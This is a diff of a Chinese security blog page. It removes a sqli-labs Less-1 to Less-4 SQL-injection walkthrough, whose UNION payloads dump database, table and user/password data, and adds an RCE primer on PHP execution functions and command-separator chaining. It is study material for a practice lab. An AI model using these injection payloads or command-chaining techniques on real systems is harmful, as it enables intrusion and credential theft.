@@ -4,17 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Less1-Less4, 小白">
-    <meta name="description" content="[TOC]
-###Less-1（字符型注入）
-0x00首先注入：
-?id&amp;#x3D;1
-
-正常返回结果
-
-由于要判断注入点，如图：
-
-添加 ‘ 报错，证明有注入点，字符型，id=1’报错是由于源码当中接收值的时候本身自己就是id=’’的闭合">
+    <meta name="keywords" content="RCE代码及命令执行漏洞, 小白">
+    <meta name="description" content="前言在 Web 应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用代码或命令执行函数去处理。比如当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏洞。同样调用系统命令处理，将造成命令执行漏洞">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -26,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Less1-Less4 | 小白</title>
+    <title>RCE代码及命令执行漏洞 | 小白</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -328,12 +319,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Less1-Less4</h1>
+                    <h1 class="description center-align post-title">RCE代码及命令执行漏洞</h1>
                 </div>
             </div>
         </div>
@@ -449,8 +440,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
-                                <span class="chip bg-color">SQL注入</span>
+                            <a href="/tags/RCE/">
+                                <span class="chip bg-color">RCE</span>
                             </a>
                         
                     </div>
@@ -461,8 +452,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/SQL%E6%B3%A8%E5%85%A5/" class="post-category">
-                                SQL注入
+                            <a href="/categories/RCE/" class="post-category">
+                                RCE
                             </a>
                         
                     </div>
@@ -474,7 +465,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-01-30
+                    2022-03-12
                 </div>
                 
 
@@ -483,7 +474,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.4k
+                    808
                 </div>
                 
 
@@ -508,165 +499,47 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>[TOC]</p>
-<p>###Less-1（字符型注入）</p>
-<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>首先注入：</p>
-<pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在 Web 应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用代码或命令执行函数去处理。比如当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏洞。同样调用系统命令处理，将造成命令执行漏洞。</p>
+<p>脑图：</p>
+<p><img src="/2022/03/12/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20220312160620185.png" alt="image-20220312160620185"></p>
+<h2 id="RCE漏洞原理"><a href="#RCE漏洞原理" class="headerlink" title="RCE漏洞原理"></a>RCE漏洞原理</h2><p>RCE(remote command/code execute，远程命令执行)漏洞，一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口，比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上。<br>一般会给用户提供一个<code>ping</code>操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次<code>ping</code>测试，并返回测试结果。如果设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。</p>
+<p>直白一点：</p>
+<p>RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。RCE分为远程命令执行ping和远程代码执行evel。</p>
+<h2 id="检测RCE漏洞"><a href="#检测RCE漏洞" class="headerlink" title="检测RCE漏洞"></a>检测RCE漏洞</h2><p><strong>涉及系统命令执行函数：</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">system()
+passthru()
+exec()
+shell_exec()
+popen()
+proc_open()
+pcntl_exec()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>正常返回结果</p>
-<p><img src="/2022/01/30/Less1-Less4/image-20220131000046458.png" alt="image-20220131000046458"></p>
-<p>由于要判断注入点，如图：</p>
-<p><img src="/2022/01/30/Less1-Less4/image-20220131000327595.png" alt="image-20220131000327595"></p>
-<p>添加 ‘ 报错，证明有注入点，字符型，id=1’报错是由于源码当中接收值的时候本身自己就是id=’’的闭合形式，但由于我们自己强行在输入1的时候添加了1’，导致闭合之后形成了id=’1’’，导致报错。</p>
-<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>执行下列语句进行绕过：</p>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&#39; or 1&#x3D;1 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>此时正常回显</p>
-<p><img src="/2022/01/30/Less1-Less4/image-20220131001026791.png" alt="image-20220131001026791"></p>
-<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>接下来判断字段数，此处可以利用 order by。Order by 对前面的数据进行排序，这里有三列数据，我们就只能用 order by 3,超过 3 就会报错。 ‘order by 4–+的结果显示结果超出。</p>
-<p>执行以下语句：</p>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/2022/01/30/Less1-Less4/image-20220131001526775.png" alt="image-20220131001526775"></p>
-<p><img src="/2022/01/30/Less1-Less4/image-20220131001643103.png" alt="image-20220131001643103"></p>
-<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>知道字段数之后，判断回显点，利用union联合注入：</p>
-<p>当 id 的数据在数据库中不存在时，（此时我们可以 id=-1，两个 sql 语句进行联合操作时， 当前一个语句选择的内容为空，我们这里就将后面的语句的内容显示出来）此处前台页面返 回了我们构造的 union 的数据。</p>
-<p>执行以下语句：</p>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/2022/01/30/Less1-Less4/image-20220131002543033.png" alt="image-20220131002543033"></p>
-<p>此时执行语句应该为：</p>
-<p>select ************ where id=’-1’ union select 1,2,3–+’ LIMIT 0,1</p>
-<p>回显点为2和3</p>
-<h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>接下来爆当前所在数据库名，爆版本号：</p>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,database(),version()--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/2022/01/30/Less1-Less4/image-20220131004721237.png" alt="image-20220131004721237"></p>
-<h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p>根据版本特性，爆数据库：</p>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,schema_name,3  from information_schema.schemata  --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/2022/01/30/Less1-Less4/image-20220131010213078.png" alt="image-20220131010213078"></p>
-<p>爆所有的数据库：</p>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,group_concat(schema_name),3  from information_schema.schemata  --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/2022/01/30/Less1-Less4/image-20220131010522814.png" alt="image-20220131010522814"></p>
-<h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><p>由于爆出所在数据库名security，爆表名：</p>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,group_concat(table_name),3  from information_schema.tables  --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/2022/01/30/Less1-Less4/image-20220131011039561.png" alt="image-20220131011039561"></p>
-<p>当前所在库的表：</p>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,group_concat(table_name),3  from information_schema.tables  where table_schema&#x3D;&#39;security&#39; --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/2022/01/30/Less1-Less4/image-20220131011254814.png" alt="image-20220131011254814"></p>
-<h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><p>可以看到users这张表是存放用户名的表，接下来利用回显点3爆出列：</p>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;),(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;) from information_schema.tables  where table_schema&#x3D;&#39;security&#39; --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/2022/01/30/Less1-Less4/image-20220131012812223.png" alt="image-20220131012812223"></p>
-<p>爆表名语句：</p>
-<pre class="line-numbers language-none"><code class="language-none">select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>爆列名语句：</p>
-<pre class="line-numbers language-none"><code class="language-none">select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>黑盒测试：网站中有特殊功能，比如Ping、数据库备份等等。</p>
+<p>白盒测试：查看命令执行函数是否做过滤。命令执行函数如下：</p>
+<p>​    PHP代码执行函数：eval()、assert()、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort()</p>
+<p>​    PHP命令执行函数：system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()</p>
+<h2 id="RCE漏洞危害"><a href="#RCE漏洞危害" class="headerlink" title="RCE漏洞危害"></a>RCE漏洞危害</h2><p>高危：</p>
+<p>直接获取服务器权限；</p>
+<p>获取敏感数据，文件；</p>
+<p>写入恶意文件getshell。</p>
+<h2 id="RCE漏洞利用"><a href="#RCE漏洞利用" class="headerlink" title="RCE漏洞利用"></a>RCE漏洞利用</h2><h5 id="windows下管道符"><a href="#windows下管道符" class="headerlink" title="windows下管道符"></a>windows下管道符</h5><pre class="line-numbers language-none"><code class="language-none">“;”：执行完前面的语句再执行后面的语句。
+“|”：显示后面语句的执行结果。
+“||”：当前面的语句执行出错时，执行后面的语句。
+“&amp;”：两条命令都执行，如果前面的语句为假则执行执行后面的语句，前面的语句可真可假。
+“&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 
-<h2 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h2><p>可以看到列的字段中出现了username和password两个字段，接下来爆用户名和密码：</p>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,group_concat(username),group_concat(password) from security.users--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/2022/01/30/Less1-Less4/image-20220131013610374.png" alt="image-20220131013610374"></p>
-<p>爆用户名语句：</p>
-<pre class="line-numbers language-none"><code class="language-none">select group_concat(username) from security.users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>爆密码语句：</p>
-<pre class="line-numbers language-none"><code class="language-none">select group_concat(password) from security.users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<hr>
-<h3 id="Lees-2（数字型注入）"><a href="#Lees-2（数字型注入）" class="headerlink" title="Lees-2（数字型注入）"></a>Lees-2（数字型注入）</h3><p>##0x00</p>
-<p>先进行判断，执行下列语句：</p>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-2&#x2F;?id&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>页面正常</p>
-<p><img src="/2022/01/30/Less1-Less4/image-20220201004057893.png" alt="image-20220201004057893"></p>
-<h2 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h2><p>注入：</p>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-2&#x2F;?id&#x3D;2  and 1&#x3D;2 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>页面异常，可得知为数字型注入。</p>
-<p><img src="/2022/01/30/Less1-Less4/image-20220201004229348.png" alt="image-20220201004229348"></p>
-<h2 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h2><p>判断字段数：</p>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-2&#x2F;?id&#x3D;2  order by 4 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/2022/01/30/Less1-Less4/image-20220201004438346.png" alt="image-20220201004438346"></p>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-2&#x2F;?id&#x3D;2  order by 3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>页面正常。</p>
-<p><img src="/2022/01/30/Less1-Less4/image-20220201004525522.png" alt="image-20220201004525522"></p>
-<h2 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h2><p>后续操作和字符型注入一样。</p>
-<hr>
-<h3 id="Lees-3"><a href="#Lees-3" class="headerlink" title="Lees-3"></a>Lees-3</h3><h2 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h2><p>使用?id=’进行尝试注入：</p>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-3&#x2F;?id&#x3D;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>注入代码后，我们得到像这样的一个错误：</p>
-<pre class="line-numbers language-none"><code class="language-none">MySQL server version for the right syntax to use near ””) LIMIT 0,1′<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>这里它意味着，开发者使用的查询是：</p>
-<pre class="line-numbers language-none"><code class="language-none">Select login_name, select password from table where id&#x3D; (‘our input here’)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>而源码当中也是如下：</p>
-<pre class="line-numbers language-none"><code class="language-none">SELECT * FROM users WHERE id&#x3D;(&#39;$id&#39;) LIMIT 0,1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/2022/01/30/Less1-Less4/image-20220201012339751.png" alt="image-20220201012339751"></p>
-<h2 id="0x01-2"><a href="#0x01-2" class="headerlink" title="0x01"></a>0x01</h2><p>因此可以尝试这样注入：</p>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-3&#x2F;?id&#x3D;1&#39;)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>页面返回正常</p>
-<p><img src="/2022/01/30/Less1-Less4/image-20220201012811806.png" alt="image-20220201012811806"></p>
-<h2 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02"></a>0x02</h2><p>接下来可以判断字段数：</p>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-3&#x2F;?id&#x3D;1&#39;) order by 3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/2022/01/30/Less1-Less4/image-20220201014121063.png" alt="image-20220201014121063"></p>
-<h2 id="0x03-2"><a href="#0x03-2" class="headerlink" title="0x03"></a>0x03</h2><p>判断回显点：</p>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-3&#x2F;?id&#x3D;-1&#39;) union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/2022/01/30/Less1-Less4/image-20220201014321625.png" alt="image-20220201014321625"></p>
-<h2 id="0x04-1"><a href="#0x04-1" class="headerlink" title="0x04"></a>0x04</h2><p>其实除了?id=1’)注入以外，根据源码可以判断出其他的注入语句：</p>
-<pre class="line-numbers language-none"><code class="language-none">&#39;) or &#39;1&#39;&#x3D;(&#39;1&#39;
-) or 1&#x3D;1 --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>第一句**’) or ‘1’=(‘1’**只要使SQL语句的语法正确，即使括号配对即可成功注入；</p>
-<p>第二句) **or 1=1 –+<strong>通过注释符把后面的</strong>‘)**注释掉即可。</p>
-<p><img src="/2022/01/30/Less1-Less4/image-20220201015418821.png" alt="image-20220201015418821"></p>
-<p><img src="/2022/01/30/Less1-Less4/image-20220201015108788.png" alt="image-20220201015108788"></p>
-<h2 id="0x05-1"><a href="#0x05-1" class="headerlink" title="0x05"></a>0x05</h2><p>其余的 payload 与 less1 中一致，只需要将 less-1 中的 ‘ 添加） 即’) </p>
-<hr>
-<h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><h2 id="0x00-2"><a href="#0x00-2" class="headerlink" title="0x00"></a>0x00</h2><p>使用以下代码进行注入：</p>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-4&#x2F;?id&#x3D;1&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>注入代码后，我们得到像这样的一个错误：</p>
-<pre class="line-numbers language-none"><code class="language-none">You have an error in your SQL syntax; check the manual that corresponds to your MySQ L server version for the right syntax to use near &#39;&quot;1&quot;&quot;) LIMIT 0,1&#39; at line<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>这里它意味着，代码当中对 id 参数进行了 “” 和 () 的包装。</p>
-<p>查看源代码：</p>
-<pre class="line-numbers language-none"><code class="language-none">$id &#x3D; &#39;&quot;&#39; . $id . &#39;&quot;&#39;;
-$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;($id) LIMIT 0,1&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>第一行id进行了””包装，之后第二行进行了()包装</p>
-<p><img src="/2022/01/30/Less1-Less4/image-20220201021526614.png" alt="image-20220201021526614"></p>
-<h2 id="0x01-3"><a href="#0x01-3" class="headerlink" title="0x01"></a>0x01</h2><p>再用如下代码注入：</p>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-4&#x2F;?id&#x3D;1&quot;) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>页面返回正常</p>
-<p><img src="/2022/01/30/Less1-Less4/image-20220201021849009.png" alt="image-20220201021849009"></p>
-<h2 id="0x02-3"><a href="#0x02-3" class="headerlink" title="0x02"></a>0x02</h2><p>判断字段数：</p>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-4&#x2F;?id&#x3D;1&quot;)  order by 4--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/2022/01/30/Less1-Less4/image-20220201022028864.png" alt="image-20220201022028864"></p>
-<h2 id="0x03-3"><a href="#0x03-3" class="headerlink" title="0x03"></a>0x03</h2><p>与Less-3一样，可成功注入的有：</p>
-<pre class="line-numbers language-none"><code class="language-none">“) or ”1”&#x3D;(“1
-“) or 1&#x3D;1 --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h5 id="linux下管道符"><a href="#linux下管道符" class="headerlink" title="linux下管道符"></a>linux下管道符</h5><pre class="line-numbers language-none"><code class="language-none">“;”：执行完前面的语句再执行后面的语句。 
+“|”：显示后面语句的执行结果。 
+“||”：当前面的语句执行出错时，执行后面的语句。
+“&amp;”：两条命令都执行，如果前面的语句为假则执行执行后面的语句，前面的语句可真可假。 “&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 
-<h2 id="0x04-2"><a href="#0x04-2" class="headerlink" title="0x04"></a>0x04</h2><p>其余的 payload 与 less1 中一致，只需要将 less-1 中的 ‘ 更换为 “)。</p>
+<p>##RCE漏洞防范:</p>
+<p>1、在进入危险函数前进行严格的检测和过滤；</p>
+<p>2、尽量不要使用命令执行函数。</p>
 
                 
             </div>
@@ -693,7 +566,7 @@ $sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;($id) LIMIT 0,1&quot;;<span ar
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://NoobXW.github.io/2022/01/30/Less1-Less4/">http://NoobXW.github.io/2022/01/30/Less1-Less4/</a>
+                    <a href="http://NoobXW.github.io/2022/03/12/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">http://NoobXW.github.io/2022/03/12/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -731,8 +604,8 @@ $sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;($id) LIMIT 0,1&quot;;<span ar
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
-                                    <span class="chip bg-color">SQL注入</span>
+                                <a href="/tags/RCE/">
+                                    <span class="chip bg-color">RCE</span>
                                 </a>
                             
                         </div>
@@ -780,17 +653,18 @@ $sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;($id) LIMIT 0,1&quot;;<span ar
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/01/31/SQL%E6%B3%A8%E5%85%A5%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%92%8C%E6%95%B0%E5%AD%97%E5%9E%8B%E5%88%A4%E6%96%AD/">
+                <a href="/2022/03/12/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="SQL注入字符型和数字型判断">
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="RCE代码及命令执行漏洞">
                         
-                        <span class="card-title">SQL注入字符型和数字型判断</span>
+                        <span class="card-title">RCE代码及命令执行漏洞</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -800,26 +674,27 @@ $sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;($id) LIMIT 0,1&quot;;<span ar
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>22-01-31
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>22-03-12
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/SQL%E6%B3%A8%E5%85%A5/" class="post-category">
-                                    SQL注入
+                            <a href="/categories/RCE/" class="post-category">
+                                    RCE
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
-                        <span class="chip bg-color">SQL注入</span>
+                    <a href="/tags/RCE/">
+                        <span class="chip bg-color">RCE</span>
                     </a>
                     
                 </div>
@@ -833,13 +708,13 @@ $sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;($id) LIMIT 0,1&quot;;<span ar
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/01/30/%E7%AE%80%E8%A6%81SQL%E6%B3%A8%E5%85%A5/">
+                <a href="/2022/03/08/CSRF%E9%9D%B6%E5%9C%BA/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="简要SQL注入">
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="CSRF靶场">
                         
-                        <span class="card-title">简要SQL注入</span>
+                        <span class="card-title">CSRF靶场</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -850,14 +725,14 @@ $sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;($id) LIMIT 0,1&quot;;<span ar
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>22-01-30
+                                <i class="far fa-clock fa-fw icon-date"></i>22-03-08
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/SQL%E6%B3%A8%E5%85%A5/" class="post-category">
-                                    SQL注入
+                            <a href="/categories/CSRF/" class="post-category">
+                                    CSRF
                                 </a>
                             
                             
@@ -867,8 +742,12 @@ $sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;($id) LIMIT 0,1&quot;;<span ar
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
-                        <span class="chip bg-color">SQL注入</span>
+                    <a href="/tags/CSRF/">
+                        <span class="chip bg-color">CSRF</span>
+                    </a>
+                    
+                    <a href="/tags/%E9%9D%B6%E5%9C%BA/">
+                        <span class="chip bg-color">靶场</span>
                     </a>
                     
                 </div>
